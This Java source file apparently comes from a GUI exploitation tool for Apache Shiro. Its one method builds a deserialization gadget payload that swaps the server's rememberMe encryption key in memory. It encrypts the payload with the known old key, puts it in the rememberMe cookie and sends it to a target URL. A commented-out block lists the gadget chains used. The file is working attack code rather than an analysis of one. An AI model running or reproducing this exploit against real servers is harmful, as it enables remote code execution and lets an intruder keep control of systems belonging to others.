package cn.safe6;

import cn.safe6.core.Constants;
import cn.safe6.core.ControllersFactory;
import cn.safe6.util.HttpClientUtil;
import cn.safe6.util.HttpTool;
import cn.safe6.util.PayloadEncryptTool;
import cn.safe6.util.ShiroTool;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.TextField;

import java.lang.reflect.Method;
import java.util.Map;

public class Tool {


    final private Map<String, Object> paramsContext = ControllersFactory.paramsContext;

    @FXML
    public TextField beanName;
    @FXML
    public TextField key;

    @FXML
    public void alter(ActionEvent actionEvent) {
        try {
            String expName = paramsContext.get("exp").toString();
            String method = paramsContext.get("method").toString();
            String oldKey = paramsContext.get("oldKey").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            String url = paramsContext.get("url").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");

            Class clazz = Class.forName(Constants.PAYLOAD_PACK + expName);
            Class clazz1 = Class.forName(Constants.PAYLOAD_PACK+"tool.AlterKeyMem");

            Method mtd = clazz.getMethod("getPayload", byte[].class);

            byte[] payload = (byte[]) mtd.invoke(null, clazz1.getMethod("getPayload",String.class,String.class).invoke(clazz1,key.getText(),beanName.getText()));

            System.out.println("payloadLen:"+payload.length);

            Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
            String encryptData;
            if (paramsContext.get("AES").equals(Constants.AES_GCM)) {
                encryptData = PayloadEncryptTool.AesGcmEncrypt(payload, oldKey);
            } else {
                encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, oldKey);
            }
            // = PayloadEncryptTool.AesGcmEncrypt(payload,key);
            String data;

            header.put("cookie", rmeValue + "=" + encryptData);

            if (method.equals(Constants.METHOD_GET)) {
                // data = HttpClientUtil.httpGetRequest(url, header);
                data = HttpTool.get(url, header);
            } else {
                data = HttpClientUtil.httpPostRequest(url, header, params);
            }
            if (data!=null){
                Controller.logUtil.printSucceedLog("秘钥修改成功："+key.getText());
            }



        } catch (Exception e) {
            e.printStackTrace();
        }

    }
/*    public void initialize() {
        try {
            this.init();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void init(){
        ObservableList<String> gadgetData = FXCollections.observableArrayList();
        gadgetData.add("CommonsBeanutils1");
        gadgetData.add("CommonsCollections11");
        gadgetData.add("CommonsCollectionsK1");
        gadgetData.add("CommonsCollectionsK2");
        gadget1.setValue("CommonsCollectionsK1");
        gadget1.setItems(gadgetData);
    }*/
}
